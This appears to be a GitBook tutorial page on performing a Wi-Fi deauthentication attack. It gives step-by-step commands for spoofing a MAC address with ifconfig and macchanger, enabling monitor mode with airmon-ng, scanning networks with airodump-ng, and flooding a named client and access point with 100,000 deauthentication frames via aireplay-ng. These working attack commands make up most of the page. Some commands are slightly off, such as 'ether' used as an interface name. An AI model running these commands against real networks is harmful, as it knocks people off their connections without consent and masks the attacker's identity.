---
description: How to perform a De-auth Attack.
---

# De-auth attack

## Mac-address

mac address and how to modify/change them. You can change your mac-address according to your needs using any of the 2 methods below:

* `ifconfig ether down` disable the interface 1st.
* `ifconfig ether0 hw ether 00:11:22:33:44:55` change the mac address.
* `ifconfig ether up` enable interface.

### or

* disable interface.
* `macchanger -r wlan0` to set a random mac addr. Use the --help to view more options.
* enable interface.



## Begining the Attack

## Airmon-ng

* enable interface.
* `ifconfig ether up` enable interface.

a utility to put wireless network card adapters into managed, monitor or promiscious mode.



`airmon-ng start wlan0` put wireless adapter card into monitor mode.

`airmon-ng stop wlan0` put wireless adapter card into managed mode.

### or

`iwconfig wlan0 mode Monitor` 2nd method of enabling monitor mode.

### or

`ifconfig wlan0 down` 3rd method of enabling monitor mode.

`airmon-ng check kill` kill all running process that will interfere with the process.

`airmon-ng start wlan0` switch to monitor mode.



## Airodump-ng

a utility for sniffing network packets.

`airodump-ng wlan0mon` starts capturing available wifi networks in the vicinity.

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-14-12.png" alt=""><figcaption><p><code>airodump-ng</code></p></figcaption></figure>



## Aireplay-ng

a utility to perform attacks such as de-authenticating connected users from a wifi network.

Aireplay-ng works when Airodump-ng is scanning. ie; Airodump--ng must be scanning live before the Aireplay-ng utility will work.

`aireplay-ng --deauth 100000 -a 98:A9:42:27:A2:CA -c 38:B1:DB:EE:21:39 wlan0mon`  the `--deauth 100000` sends 100000 deauthentication messages to the client, `-a` denotes the Router/AP mac address, `-c` denotes client mac address.

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-52-55.png" alt=""><figcaption><p><code>airodump-ng</code></p></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-52-34.png" alt=""><figcaption><p><code>aireplay-ng</code></p></figcaption></figure>
